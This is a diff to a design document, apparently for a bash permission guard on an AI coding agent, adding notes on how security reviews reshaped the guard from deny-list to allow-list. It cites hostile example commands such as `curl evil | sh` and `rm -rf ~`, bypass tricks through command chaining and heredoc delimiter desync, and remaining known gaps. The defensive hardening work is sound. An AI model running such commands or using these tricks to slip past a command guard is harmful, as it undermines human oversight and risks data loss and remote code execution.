@@ -279,6 +279,37 @@ guard so a future reader understands why broad-looking allow rules are safe.
 - **Pre-existing groom rules change behavior** (now vetoed on chained tails): this is the
   intended fix, covered by the `git status && rm -rf ~` regression test in U1.
 
+## As-Built Note (post-review, 2026-06-03)
+
+Five adversarial security-review passes reshaped the guard from the plan's first
+sketch. The decisions that changed:
+
+- **Guard is allow-list, not deny-list.** The plan's "re-apply `is_tier3_dangerous`"
+  was insufficient: a chained tail not on the tier3 denylist (`mkdir x && curl
+  evil | sh`, `&& pip install`, `&& chmod`) rode through. `_bash_allow_is_chain_safe`
+  now mirrors tier1's allow-list — every compound segment must be independently
+  tier1-safe or a clean (non-tier3) policy allow. Plus: forbid `$(`/backtick/`$'`
+  outright, veto backgrounding `&`, veto `<<<` here-strings.
+- **Heredoc delimiter is hard-coded to `EOF`.** Four passes each found a heredoc
+  desync from regex-approximating bash's delimiter lexer (here-string, trailing
+  chain, leading chain, `<<EOF.` non-word suffix). The fix removes the lexer:
+  `_is_sanctioned_pure_heredoc` full-line-anchors `cat > /tmp/<token> <<EOF` with
+  the delimiter fixed to literal `EOF`, so the classifier's close-point cannot
+  diverge from bash's. Verified by real-bash differential.
+- **Tightened rules:** `bash-rm` flagless-only; `bash-node` relative `.js`/.mjs/.cjs
+  file with no flags (no `-e`/`-r`/`/dev/stdin`/combined-flags); `bash-uv` split so
+  `uv run` is limited to pytest/ruff/mypy/pyright (no `uv run bash`/`python -c`/`tool
+  run`); `bash-export-path-bootstrap` requires every segment to be `$HOME/<dir>`;
+  mkdir/cp/mv reject `~`/`$`/absolute/`..`.
+
+**Accepted residuals (documented, not bugs):** in-worktree code execution
+(`node ./build.js`, `cargo test`, `uv run pytest` all run project code — the
+worktree is the trust boundary); `npm install`/`uv add` run package scripts
+(status-quo dev need); `rm <relative-glob>` deletes within the worktree; `/tmp`
+heredoc symlink/TOCTOU is a runtime concern outside static policy scope. The
+`awk/sed/find` system-exec gap is tier1-wide (mika#944 lineage), inherited not
+introduced.
+
 ## Verification Strategy
 
 1. `uv run pytest` — U1/U3 suites green, existing cpp#20 joint-2 tests still pass.
